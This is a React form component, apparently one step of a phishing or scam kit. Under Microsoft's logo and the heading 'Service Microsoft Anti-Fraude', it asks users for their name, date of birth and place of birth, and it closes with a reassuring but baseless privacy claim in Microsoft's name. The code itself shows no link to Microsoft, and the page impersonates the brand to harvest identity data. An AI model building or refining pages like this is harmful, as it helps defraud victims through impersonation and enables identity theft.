export default function UserVerificationForm({ onNext }) {
  const handleSubmit = (e) => {
    e.preventDefault();
    const data = {
      nom: document.getElementById("nom").value,
      prenom: document.getElementById("prenom").value,
      dob: document.getElementById("dob").value,
      pob: document.getElementById("pob").value,
    };
    onNext(data);
  };

  return (
    <div className="form-container">
      <div className="form-header">
        <img
          src="https://img.icons8.com/color/48/microsoft.png"
          alt="Microsoft Logo"
          className="logo"
        />
        <h2>Service Microsoft Anti-Fraude</h2>
      </div>
      <div className="form-title">
        <span className="lock-icon">🔒</span>
        <h1>Vérification de l'utilisateur</h1>
      </div>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="nom">Nom</label>
          <input type="text" id="nom" name="nom" />
        </div>
        <div className="form-group">
          <label htmlFor="prenom">Prénom</label>
          <input type="text" id="prenom" name="prenom" />
        </div>
        <div className="form-group">
          <label htmlFor="dob">Date de naissance</label>
          <input type="text" id="dob" name="dob" placeholder="JJ/MM/AAAA" />
        </div>
        <div className="form-group">
          <label htmlFor="pob">Lieu de naissance</label>
          <input type="text" id="pob" name="pob" />
        </div>
        <button type="submit" className="btn-submit">Suivant</button>
      </form>
      <p className="privacy-text">
        Microsoft respecte votre vie privée. Aucune donnée n'est stockée sans consentement.
      </p>
    </div>
  );
}
